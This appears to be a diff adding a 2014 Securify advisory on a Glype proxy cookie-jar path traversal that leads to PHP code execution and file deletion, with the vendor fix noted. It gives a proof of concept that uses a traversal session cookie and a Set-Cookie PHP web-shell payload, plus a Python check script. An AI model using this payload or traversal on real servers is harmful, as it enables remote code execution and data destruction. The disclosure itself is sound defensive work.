@@ -1,0 +1,84 @@
+------------------------------------------------------------------------
+Glype proxy cookie jar path traversal allows code execution
+------------------------------------------------------------------------
+Securify, September 2014
+
+------------------------------------------------------------------------
+Abstract
+------------------------------------------------------------------------
+A path traversal vulnerability has been identified in the Glype
+web-based proxy that allows an attacker to run arbitrary PHP code on the
+server or to remove critical files from the filesystem. This only
+affects servers that are configured to:
+
+- store Glype cookies locally; AND
+- disable PHP display_errors; AND
+- allow the webserver process to write to the filesystem (document
+root).
+
+------------------------------------------------------------------------
+Affected versions
+------------------------------------------------------------------------
+This issue has been identified in Glype 1.4.9. Older version are most
+likely affected as well.
+
+------------------------------------------------------------------------
+Fix
+------------------------------------------------------------------------
+Glype was informed and a fixed version (1.4.10) is now available at
+www.glype.com
+
+------------------------------------------------------------------------
+Details
+------------------------------------------------------------------------
+http://www.securify.nl/advisory/SFY20140901/glype_proxy_cookie_jar_path_traversal_allows_code_execution.html 
+
+File creation via path traversal
+
+When the "Store cookies on server" option is set in admin.php, Glype will create a cookie jar on the server to store a user's cookies. The filename for the cookie jar is created using the user's session ID.
+
+browse.php
+
+$toSet[CURLOPT_COOKIEFILE] = $toSet[CURLOPT_COOKIEJAR] = $CONFIG['cookies_folder'] . session_id();
+PHP takes this session ID from a cookie, so the value returned by session_id() is under control of the user. By using path traversal a user can overwrite or create any file on the server with the rights of the webserver's system user.
+
+Code execution
+
+As a POC the following steps were taken to create and run a malicious PHP file in the webroot:
+
+1. Glype was installed with the "Store cookies on server" option set in admin.php. The cookie directory remained default (tmp/cookies/).
+2. A request was initiated with the Glype session cookie's value set to "../../test.php".
+3. The Glype proxy was used to surf to a Securify controlled domain that returned a header that set a cookie containing a malicious PHP script.
+
+Set-Cookie: TestCookie=<?php echo shell_exec($_GET['cmd']) ?>; expires=Thu, 31-Aug-2014 19:14:10 GMT
+
+This caused Glype to write this PHP backdoor to test.php in the webroot. When requested using a browser, PHP parses the cookie jar file containing the malicious PHP code.
+
+The following Python code can be used as a simple test to verify if your Glype installation is affected:
+
+import urllib2
+
+server = 'http://<glype server>'
+url = '/browse.php?u=http%3A%2F%2Fwww.glype.com&b=28'
+
+req = urllib2.Request(server + url)
+req.add_header('Referer', server)
+req.add_header('Cookie', 's=../securify')
+r = urllib2.urlopen(req)
+
+You are affected if a file named "securify" is created outside of the cookie directory.
+
+Arbitrary file removal
+
+The following code is affected by a (similar) path traversal vulnerability allowing an attacker to remove any file the HTTP process has access to:
+
+includes/process.php
+
+# Look for cookie file and check writable
+if ( is_writable($file = $CONFIG['cookies_folder'] . session_id()) ) {
+
+   # Delete it
+   unlink($file);
+}
+
+This can for example be exploited to put a Glype server out of service or to clear log files.
